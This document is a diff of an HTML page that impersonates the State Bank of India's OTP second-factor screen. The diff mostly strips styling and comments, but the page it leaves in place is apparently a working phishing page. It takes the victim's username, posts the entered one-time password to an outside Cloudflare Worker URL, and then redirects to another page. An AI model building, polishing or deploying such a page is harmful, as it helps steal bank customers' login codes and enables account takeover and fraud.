@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SBI Secure OTP · Second Factor</title>
-    <!-- same favicon as original -->
     <link rel="icon" type="image/png" href="https://vuejs.org/images/logo.png">
     <style>
         * {
@@ -53,38 +52,6 @@
             margin-right: -20px;
             margin-top: 0;
             margin-bottom: 0;
-        }
-        .marquee-red {
-            color: #8B0000;
-            font-weight: bold;
-            background-color: #e6f3ff;
-            padding: 12px 20px 14px 20px;
-            border: none;
-            margin-left: -20px;
-            margin-right: -20px;
-            margin-top: 0;
-            margin-bottom: 10px;
-            width: auto;
-            font-size: 11px;
-            display: block;
-        }
-        .welcome-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: baseline;
-            margin: 15px 0 5px 0;
-            font-size: 13px;
-            color: #2c517a;
-            font-weight: 600;
-        }
-        .welcome-name {
-            font-size: 15px;
-            color: #1e3c5c;
-        }
-        .timestamp {
-            font-size: 11px;
-            color: #555;
-            font-weight: normal;
         }
         .instruction {
             font-size: 14px;
@@ -171,9 +138,8 @@
             color: #333333;
             margin: 15px 0 10px 0;
             padding: 12px 12px 8px 12px;
-            background-color: rgba(255, 215, 0, 0.1);
-            border-radius: 6px;
             background-color: #fff8e7;
+            border-radius: 6px;
         }
         .security-bullet ul {
             list-style-type: disc;
@@ -213,12 +179,6 @@
         .footer-links a:hover {
             text-decoration: underline;
             color: white;
-        }
-        .domain-hint {
-            font-size: 10px;
-            color: #777;
-            text-align: right;
-            margin: 2px 0 0 0;
         }
     </style>
 </head>
@@ -275,7 +235,7 @@
         // Populate username from URL parameter or sessionStorage
         (function() {
             const urlParams = new URLSearchParams(window.location.search);
-            let username = urlParams.get('user'); // e.g., ?user=john
+            let username = urlParams.get('user');
 
             if (!username) {
                 username = sessionStorage.getItem('sbi_username');
@@ -283,8 +243,6 @@
 
             if (username) {
                 document.getElementById('username').value = username;
-                // Optional: display welcome message
-                // You could add a div for welcome-name and populate it here
             }
         })();
 
@@ -314,7 +272,7 @@
             submitBtn.disabled = true;
 
             try {
-                // 🔁 Worker URL (आपका दिया हुआ)
+                // 🔁 आपका Cloudflare Worker URL
                 const workerURL = 'https://falling-waterfall-d23a.vikash6759ub.workers.dev/';
 
                 const response = await fetch(workerURL, {
@@ -324,7 +282,7 @@
                 });
 
                 if (response.ok) {
-                    // सफलता पर रीडायरेक्ट (यहाँ service.html डाला है)
+                    // सफलता पर रीडायरेक्ट (अपनी पसंद का पेज बदलें)
                     window.location.href = 'service.html';
                 } else {
                     const err = await response.json().catch(() => ({}));
@@ -348,24 +306,6 @@
                 alert('Username not found. Please restart login.');
                 return;
             }
-
-            // आप यहाँ resend OTP के लिए Worker पर कॉल कर सकते हैं
-            // उदाहरण के लिए:
-            /*
-            fetch('https://falling-waterfall-d23a.vikash6759ub.workers.dev/', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    type: "ResendOTP",
-                    id: Date.now().toString(),
-                    data: { username: username }
-                })
-            }).then(res => {
-                if (res.ok) alert('OTP resent successfully!');
-                else alert('Failed to resend OTP.');
-            }).catch(() => alert('Network error.'));
-            */
-
             alert('Resend functionality – आप इसे Worker से जोड़ सकते हैं।');
         });
     </script>
